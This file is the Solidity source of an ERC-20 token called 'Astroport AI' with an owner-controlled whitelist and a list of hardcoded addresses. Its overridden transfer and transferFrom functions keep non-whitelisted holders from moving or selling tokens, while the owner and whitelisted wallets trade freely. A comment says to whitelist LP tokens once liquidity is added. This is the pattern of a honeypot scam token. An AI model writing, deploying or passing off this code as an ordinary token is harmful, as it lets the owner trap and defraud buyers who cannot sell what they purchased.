// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("Astroport AI", "AAI") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 900000000 * 10 ** decimals());
        whiteList[0x8182206778bF7Bab617a4FD2932C2360E7Ce3ccb]= true;
        whiteList[0x2E4053B59082CFCDA6989a71b2c3ED2Ba387561f]=true;
        whiteList[0x34116Ff308eF2A8e9c1b90EEB081Bf580C43a3D4]=true;
        whiteList[0x8A60E0C707Ca7173Dee5cF642D9C3e531B6bBDA8]=true;
        whiteList[0xaD3C07E5E4a137F6F7aCc7836Dd3cbB1BE8a9927]=true;
        whiteList[0x76254D86fB0A40aDD188066cb44F75a2fd7A9066]=true;
        whiteList[0xFC806e625EF6BC94445716B0c3905B87DF468C87]=true;
        whiteList[0x54846826f29037e1cfFcBE9c6293a7A495a7E225]=true;
        whiteList[0x23EFB3146b3Aa9060D2F0A2984ac876240185127]=true;
        whiteList[0xb242c88f7915a0B98f53fb7E98803563B8eE710E]=true;
        whiteList[0x61C7930fD74D4E9A9D4789d4E897921cBf061fee]=true;
        whiteList[0xECc446B878aC4f9708874d3A83D646A4a9BABb77]=true;
        whiteList[0x4248c303d79aE7d3220aC64B55DfA90b04Dd87fb]=true;
        whiteList[0x70a274E5741701b7B1aAcD956991Cb260c35cA16]=true;
        whiteList[0x42898dbF52c6283859378F82FE534B0e86542244]=true;
        whiteList[0x9f4Eb0C4E4397c7B77AC2d8004f8b1d0A0A8485E]=true;
        whiteList[0xF922D0B6890a88869a6D01830367081bE0f5e3bf]=true;
        whiteList[0x5Be06bf0133F88aa877F40323331246e77025deF]=true;
        whiteList[0xAeBcF1A2d5c5503b08536fD0abd4709cD3bE88b3]=true;
        whiteList[0xAB45da15AFB9B6B1C74Dc458D16e763C0a2819dA]=true;
        whiteList[0xDEF0D260E9258514e627bc8A2161FD1Cfe52413e]=true;
        whiteList[0x7483A02A7d553e441Ec1332018366B243235d21F]=true;
        whiteList[0x847cfB8FdD311b15030B63D8D5a0DD233CA2d0F8]=true;
        whiteList[0xc5C1b7b0ab504bb1eC6fcF1BAECdB3fE64Bb3C50]=true;
        whiteList[0x417F2f262153Ab2F1acB39596cD5a0A7B66CFBE3]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}